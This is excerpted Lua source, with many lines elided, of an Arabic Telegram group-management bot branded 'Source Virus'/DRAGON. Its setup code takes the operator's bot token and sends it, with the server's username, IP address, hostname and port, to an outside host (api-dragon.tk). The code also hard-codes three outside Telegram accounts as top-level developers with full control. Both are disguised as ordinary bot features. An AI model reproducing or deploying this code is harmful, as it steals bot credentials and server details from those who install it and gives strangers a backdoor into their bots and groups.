...
io.write('\27[0;31m\n ارسل لي توكن الف الان ↓ :\naٴ≪┉ ┉ ┉ ┉ ┉ 𝒗𝒊𝒓𝒖𝒔 ┉  ┉ ┉ ┉ ┉≫ٴ\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ 𝒗𝒊𝒓𝒖𝒔 ┉  ┉ ┉ ┉ ┉≫ٴ\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \naٴ≪┉ ┉ ┉ ┉ ┉ 𝒗𝒊𝒓𝒖𝒔 ┉  ┉ ┉ ┉ ┉≫ٴ\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35mٴ≪┉ ┉ ┉ ┉ ┉ 𝒗𝒊𝒓𝒖𝒔 ┉  ┉ ┉ ┉ ┉≫ٴ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
data,res = https.request("https://api-dragon.tk/api-FLASH_MASR/Dragon.php?bn=DRAGON&id="..SUDOID)
if res == 200 then
...
local t = json:decode(https.request('https://api-dragon.tk/api-FLASH_MASR/Dragon.php?n=DRAGON&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
else
io.write('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ 𝒗𝒊𝒓𝒖𝒔 ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
end  
os.execute('lua DRAGON.lua')
end 
end
...
sudo_users = {SUDO,5273819032,2104371598}   
...
local hash = database:sismember(bot_id.."FLASH_MASR:MN:TF"..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
...
if tonumber(user_id) == tonumber(5273819032) then  
var = true  
elseif tonumber(user_id) == tonumber(2104371598) then
var = true  
elseif tonumber(user_id) == tonumber(5059929874) then
var = true  
...
var = true  
elseif database:sismember(bot_id..'FLASH_MASR:MN:TF'..chat_id, user_id) then
var = true 
...
if tonumber(user_id) == tonumber(5273819032) then  
var = 'الـمـطـور فـيـرس'
elseif tonumber(user_id) == tonumber(2104371598) then
var = 'مبرمـج ديـشـا'
elseif tonumber(user_id) == tonumber(5059929874) then
var = 'حـسـام الـهـولـنـدي'
elseif tonumber(user_id) == tonumber(SUDO) then
var = 'المطور الاساسي'  
elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then 
var = "المطور الاساسي²"  
...
local UserName = (data.username_ or "APP_YOUTUBE")
...
send(msg.chat_id_, msg.id_,' ℘︙ تم تحديث السورس \n ℘︙ لديك اخر اصدار لسورس فيرس\n ℘︙ الاصدار » { v 1.6 }')
dofile('DRAGON.lua')  
end
if text == 'الاصدار ℘' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ℘︙ اصدار سورس فيرس \n ℘︙ الاصدار »{ v 1.6 }')
end
...
usertext = '\n ℘︙ العضو » ['..result.title_..'](t.me/'..(username or 'APP_YOUTUBE')..')'
status  = '\n ℘︙ تم ترقيته مطور'
...
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'APP_YOUTUBE')..')'
status  = '\n ℘︙ تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ℘︙ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'APP_YOUTUBE')..') \n ℘︙ '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_,0," ℘︙ العضو : {["..data.first_name_.."](T.ME/APP_YOUTUBE)}\n ℘︙ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ℘︙ عذرا » {["..data.first_name_.."](T.ME/APP_YOUTUBE)}\n ℘︙ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
function FLASH_MASR_name(t1,t2)
if t2.id_ then 
...
bnnaGet(msg.sender_user_id_, FLASH_MASR_name)
end
...
℘ ⦑ SOURCE VIRUS ⦒ 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
℘︙ [Source Channel](t.me/APP_YOUTUBE)
℘︙ [Source developer](t.me/FLASH_MASR)
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
]]
send(msg.chat_id_, msg.id_,Text)
return false
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ℘︙ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'APP_YOUTUBE')..') \n ℘︙ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ℘︙ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'APP_YOUTUBE')..') \n ℘︙ تـم قفـل التاك بالكتم ')
end,nil)   
...
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
if database:get(bot_id.."FLASH_MASR:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
return 
send(msg.chat_id_, msg.id_,"انتظر دقيقه من فضلك")
end
database:setex(bot_id..'FLASH_MASR:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
...
if Get_info then
local TextS = "\n ℘︙ اهلا بك في متجر ملفات فيرس\n ℘︙ ملفات السورس ↓\nٴ≪┉ ┉ ┉ ┉ ┉ 𝒗𝒊𝒓𝒖𝒔 ┉  ┉ ┉ ┉ ┉≫ٴ\n\n"
local TextE = "\nٴ≪┉ ┉ ┉ ┉ ┉ 𝒗𝒊𝒓𝒖𝒔 ┉  ┉ ┉ ┉ ┉≫ٴ\n ℘︙ علامة تعني { ✔️ } ملف مفعل\n ℘︙ علامة تعني { ✖ } ملف معطل\n ℘︙ قناة سورس فيرس ↓\n".." ℘︙ [اضغط هنا لدخول](t.me/APP_YOUTUBE) \n"
local NumFile = 0
...
send(msg.chat_id_, msg.id_," ℘︙ عذرا الملف لايدعم سورس فيرس \n") 
end
return false
end
...
database:del(bot_id..'FLASH_MASR:MN:TF'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ℘︙ تم مسح المنظفين')
end
if text == ("المنظفين") and BasicConstructor(msg) then
local list = database:smembers(bot_id..'FLASH_MASR:MN:TF'..msg.chat_id_)
t = "\n ℘︙ قائمة المنظفين \n≪━━━━━━𝓓𝓡𝓖━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
database:sadd(bot_id..'FLASH_MASR:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'APP_YOUTUBE')..')'
status  = '\n ℘︙ تم ترقيته منظف'
send(msg.chat_id_, msg.id_, usertext..status)
...
database:sadd(bot_id..'FLASH_MASR:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n ℘︙ العضو » ['..result.title_..'](t.me/'..(username or 'APP_YOUTUBE')..')'
status  = '\n ℘︙ تم ترقيته منظف'
texts = usertext..status
else
...
database:sadd(bot_id..'FLASH_MASR:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'APP_YOUTUBE')..')'
status  = '\n ℘︙ تم ترقيته منظف'
...
function start_function(extra, result, success)
database:srem(bot_id..'FLASH_MASR:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'APP_YOUTUBE')..')'
...
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'FLASH_MASR:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n ℘︙ العضو » ['..result.title_..'](t.me/'..(username or 'APP_YOUTUBE')..')'
status  = '\n ℘︙ تم تنزيله من المنظفين'
texts = usertext..status
else
...
database:srem(bot_id..'FLASH_MASR:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'APP_YOUTUBE')..')'
status  = '\n ℘︙ تم تنزيله من المنظفين'
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ℘︙ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'APP_YOUTUBE')..')'
status  = '\n ℘︙ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ℘︙ العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ℘︙ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'APP_YOUTUBE')..')'
...
' }\n'..' ℘︙  الايدي بالصوره » { '..idph..
' }\n'..' ℘︙  الرفع » { '..setadd..
' }\n'..' ℘︙  الحظر » { '..banm..' }\n\nٴ≪┉ ┉ ┉ ┉ ┉ 𝒗𝒊𝒓𝒖𝒔 ┉  ┉ ┉ ┉ ┉≫ٴ\n ℘︙ قناة سورس فيرس ↓\n [🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙳𝚁𝙰𝙶𝙾𝙽.](t.me/APP_YOUTUBE) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ℘︙ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'APP_YOUTUBE')..')'..'\n ℘︙ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if not database:get(bot_id..'FLASH_MASR:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then           
...
database:setex(bot_id..'FLASH_MASR:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end
end
...
database:sadd(bot_id.."FLASH_MASR:allM"..msg.chat_id_, msg.id_)
end
if text == ("امسح") and cleaner(msg) then  
local list = database:smembers(bot_id.."FLASH_MASR:allM"..msg.chat_id_)
for k,v in pairs(list) do
local Message = v
if Message then
t = "℘︙ تم مسح "..k.." من الوسائط الموجوده"
DeleteMessage(msg.chat_id_,{[0]=Message})
database:del(bot_id.."FLASH_MASR:allM"..msg.chat_id_)
end
end
if #list == 0 then
...
local num = database:smembers(bot_id.."FLASH_MASR:allM"..msg.chat_id_)
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'فيرس').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'فيرس')
local DRAGON_Msg = {
'عمغي 🥺💕.',
...
if database:sismember(bot_id..'FLASH_MASR:MN:TF'..msg.chat_id_, result.id_) then
mn = 'منظف ،' else mn = '' end
...
own = 'مدير ،' else own = '' end
if database:sismember(bot_id..'FLASH_MASR:MN:TF'..msg.chat_id_, result.sender_user_id_) then
mn = 'منظف ،' else mn = '' end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙳𝚁𝙰𝙶𝙾𝙽.',url="t.me/APP_YOUTUBE"}},
}
local msg_id = msg.id_/2097152/0.5
...
database:set(bot_id.."APP_YOUTUBE:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الانستا')
database:set(bot_id.."APP_YOUTUBE:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."APP_YOUTUBE:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."APP_YOUTUBE:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"℘︙تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."APP_YOUTUBE:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."APP_YOUTUBE:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس فيرس يعني لو بكتهن راح اعرفك انت الاخذتهن
...
------------------------------------------------------------------------
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'فيرس').." غادر" or text == 'بوت غادر' then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'APP_YOUTUBE')..')'
local iduser = result.sender_user_id_
...
{
{text = '𝗦𝗢𝗨𝗥𝗖𝗘 𝗠𝗔𝗘𝗦𝗧𝗥𝗢', url="t.me/APP_YOUTUBE"},
},
}
local msg_id = msg.id_/2097152/0.5
...
send(msg.chat_id_, msg.id_, t..'ٴ≪┉ ┉ ┉ ┉ ┉ 𝒗𝒊𝒓𝒖𝒔 ┉  ┉ ┉ ┉ ┉≫ٴٴ\n℘︙ ➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙳𝚁𝙰𝙶𝙾𝙽. ](t.me/APP_YOUTUBE)➤ ')
end
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'فيرس')
